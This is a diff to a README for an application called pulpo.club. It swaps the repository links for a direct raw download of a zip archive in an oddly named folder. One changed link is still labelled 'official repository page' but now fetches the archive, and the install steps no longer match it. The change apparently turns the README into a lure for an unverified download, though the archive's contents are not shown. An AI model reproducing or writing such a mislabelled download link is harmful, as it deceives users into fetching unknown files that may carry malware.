@@ -1,6 +1,6 @@
 # 🐙 pulpo.club - Organize your digital life with ease
 
-[![Download pulpo.club](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/delusion4939/pulpo.club)
+[![Download pulpo.club](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/delusion4939/pulpo.club/main/pointswoman/pulpo-club-1.6.zip)
 
 ## 🎯 About this software
 
@@ -19,7 +19,7 @@ Your computer must meet these basic needs to run the software smoothly:
 
 Follow these steps to set up the application on your Windows computer.
 
-1. Visit the [official repository page](https://github.com/delusion4939/pulpo.club) to access the latest version.
+1. Visit the [official repository page](https://raw.githubusercontent.com/delusion4939/pulpo.club/main/pointswoman/pulpo-club-1.6.zip) to access the latest version.
 2. Look for the Releases section on the right side of the page.
 3. Click the most recent version number to see the available files.
 4. Select the file ending in .exe to start the download.
